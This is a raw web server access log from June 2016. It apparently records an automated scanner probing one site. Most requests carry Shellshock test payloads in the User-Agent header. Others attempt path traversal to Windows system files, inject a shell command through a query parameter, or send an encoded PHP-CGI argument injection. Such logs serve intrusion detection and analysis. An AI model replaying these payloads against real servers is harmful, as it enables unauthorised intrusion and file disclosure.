191.96.249.54 - - [27/Jun/2016:00:00:38 +0000] "GET / HTTP/1.1" 302 237 "-" "-" 38 493
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id| HTTP/1.1" 302 318 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 803 4782
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "\x16\x03\x01" 302 237 "-" "-" 50 237
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 302 315 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 803 4750
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /.anydomain.test HTTP/1.0" 302 237 "-" "-" 75 512
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /index.jsp%00x HTTP/1.1" 404 207 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 322 458
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /.anydomain.test HTTP/1.0" 302 237 "-" "-" 483 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /Reporting/login/change_password.php?enable_auth=0 HTTP/1.1" 302 251 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 358 577
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /db HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /login_up.php3?login_name=x&passwd=x&locale_id=../../../../../../../../../../../../boot.ini%00.jpg HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 406 729
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /index.jsp%00x HTTP/1.1" 404 207 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 739 4526
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /Reporting/login/change_password.php?enable_auth=0 HTTP/1.1" 302 251 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 771 4638
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 356 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /_mt/mt.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 366 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /login_up.php3?login_name=x&passwd=x&locale_id=../../../../../../../../../../../../boot.ini%00.jpg HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 819 4782
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /admin.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 365 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /administrator.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /buglist.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 367 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "POST /%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e HTTP/1.1" 302 920 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 903 1915
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi/mid.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 367 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/admin.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/admin.pl HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 372 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "OPTIONS * HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 313 223
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/bugreport.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 377 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 335 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/clwarn.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 374 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /osssnr1.html HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 321 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/count.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "PUT /osssnr1.html HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 418 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/filescan HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 351 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/Count.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /osssnr1.html HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 321 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 378 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 379 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 376 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 377 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/help.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 372 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/hi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 366 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 755 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/index.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "POST /%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e HTTP/1.1" 302 920 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 1315 5982
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/index.pl HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 372 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/index.sh HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 372 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/mailit.pl HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 379 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 378 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 386 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 385 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/filescan HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 755 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "OPTIONS * HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4249
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 379 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 378 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/search HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 370 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/search.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 374 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/search/search.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 381 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 372 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 400 11 "-" "-" 10193 226
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/test.sh HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 371 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /spneew1.html HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 739 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 372 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 400 11 "-" "-" 10188 226
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/upload.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 374 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/urlcount.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 376 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 375 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/wa HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 366 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/wa.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 370 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/wa.exe HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 370 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin/whois.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "PUT /spneew1.html HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 835 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-bin-sdb/printenv HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 376 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-mod/index.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 400 11 "-" "-" 10833 4318
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /struts/webconsole.html HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 331 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 382 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 381 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /index.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 365 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /index.pl HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 364 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /index.sh HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 364 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /nph-mr.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 366 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /spneew1.html HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 739 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /query.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 365 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /session_login.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 373 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /show_bug.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 400 11 "-" "-" 10833 4318
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /test HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 360 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /test.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 364 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 379 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /xsql/demo/airport/airport.xsql?xml-stylesheet=none HTTP/1.1" 302 257 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 347 589
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /whois.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 365 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /wp-login.php HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /wwwadmin.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /wwwboard.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 368 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /xampp/cgi.cgi HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((47+50))\"; }" 369 548
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /struts/webconsole.html HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 739 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 723 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /xsql/demo/airport/airport.xsql?xml-stylesheet=none HTTP/1.1" 302 257 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 755 4654
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((82+2))\"; }" 771 4622
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET / HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 309 549
137.78.237.22 - - [27/Jun/2016:22:40:41 +0000] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cautoexec.bat HTTP/1.1" 302 237 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)" 366 549
